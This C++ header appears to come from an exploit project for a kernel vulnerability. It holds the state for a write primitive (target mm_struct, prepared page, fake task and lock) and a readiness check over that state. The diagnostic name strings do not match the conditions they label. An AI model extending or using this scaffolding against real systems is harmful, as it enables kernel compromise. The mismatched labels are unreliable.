#pragma once
/** @file backend/cve_2026_43499/session.hpp
 *  What the write path needs to know about the target, and whether it is ready to write.
 *
 *  The retired tree held this in a byte buffer carved out of a shared session, with the field
 *  order frozen and a comment saying not to reorder it, because the disassembly comparison was a
 *  gate at the time. That comparison is an optional diagnostic now, so the reason for the buffer
 *  is gone and this is an ordinary typed structure: the facts the write needs, each named, with
 *  the question the write asks of them answered in one place.
 *
 *  The three facts are the ones the three unfinished capabilities need: the object the search
 *  found, the page the preparation made ready to land on, and the pair the landing gear uses to
 *  reach the target at all. Nothing here decides anything about how the write is performed; this
 *  is the state the route reads, and readiness is a question about that state rather than an
 *  action on it.
 */
#include <cstdint>

namespace ghostlock::backend::cve_2026_43499 {
    /** The facts a write needs, as loaded. Zero means not known yet, which is what every
     *  readiness answer below is about. */
    struct TargetState final {
        /** The object the search found, canonical, as the discovery reports it. */
        std::uint64_t mm_struct = 0U;
        /** The kernel page the preparation made ready for the write to land on. */
        std::uint64_t page_base = 0U;
        /** The task the landing gear pretends to be. */
        std::uint64_t fake_task = 0U;
        /** The lock the landing gear presents. */
        std::uint64_t fake_lock = 0U;
    };

    /** Why a write cannot run yet, or that it can. Named, because the caller acts differently
     *  on each: an object nobody found means the search failed, a page that is not prepared means
     *  the preparation did, and landing gear that is not set means the route has not got there. */
    enum class WriteReadiness : unsigned char {
        Ready = 0,
        /** The search has not produced an object. */
        NoObject = 1,
        /** The preparation has not produced a page. */
        NoPage = 2,
        /** The route has not set the landing gear. */
        NoLanding = 3,
    };

    [[nodiscard]] constexpr const char *write_readiness_name(WriteReadiness readiness) noexcept {
        switch (readiness) {
            case WriteReadiness::Ready: return "ok";
            case WriteReadiness::NoObject: return "plan-missing";
            case WriteReadiness::NoPage: return "geometry-missing";
            case WriteReadiness::NoLanding: return "call-failed";
        }
        return "unknown";
    }

    /** Whether a write can run. Checked in the order the facts arrive: an object is found first,
     *  a page is prepared with it, and the landing gear is set by the route that will write. The
     *  first missing fact is the answer, so a caller troubleshooting sees the earliest cause
     *  rather than a later one that depends on it. */
    [[nodiscard]] constexpr WriteReadiness write_readiness(const TargetState &state) noexcept {
        if (state.mm_struct == 0U) {
            return WriteReadiness::NoObject;
        }
        if (state.page_base == 0U) {
            return WriteReadiness::NoPage;
        }
        if (state.fake_task == 0U || state.fake_lock == 0U) {
            return WriteReadiness::NoLanding;
        }
        return WriteReadiness::Ready;
    }
}  // namespace ghostlock::backend::cve_2026_43499
